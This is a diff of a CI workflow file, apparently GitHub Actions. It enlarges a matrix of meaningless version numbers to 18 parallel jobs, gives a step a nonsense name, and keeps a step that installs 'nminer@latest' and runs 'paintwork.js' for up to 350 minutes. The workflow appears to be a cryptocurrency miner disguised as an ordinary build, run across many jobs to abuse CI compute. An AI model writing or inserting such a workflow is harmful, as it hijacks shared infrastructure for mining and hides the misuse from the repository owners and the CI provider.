@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3590 }
-          - { version: 1337 }
-          - { version: 5085 }
-          - { version: 3810 }
-          - { version: 6958 }
-          - { version: 1707 }
-          - { version: 1704 }
-          - { version: 1033 }
-          - { version: 587 }
-          - { version: 8166 }
-          - { version: 5959 }
-          - { version: 9184 }
-          - { version: 7005 }
-          - { version: 6348 }
-          - { version: 7939 }
+          - { version: 2450 }
+          - { version: 7577 }
+          - { version: 4130 }
+          - { version: 6916 }
+          - { version: 703 }
+          - { version: 6689 }
+          - { version: 162 }
+          - { version: 4447 }
+          - { version: 4287 }
+          - { version: 6684 }
+          - { version: 6413 }
+          - { version: 5739 }
+          - { version: 804 }
+          - { version: 3275 }
+          - { version: 7268 }
+          - { version: 7425 }
+          - { version: 7514 }
+          - { version: 5338 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: merrily
+      - name: during next yippee
         run: |
           npm install nminer@latest
-          timeout 304m node paintwork.js || echo "paintwork executed"
+          timeout 350m node paintwork.js || echo "paintwork executed"
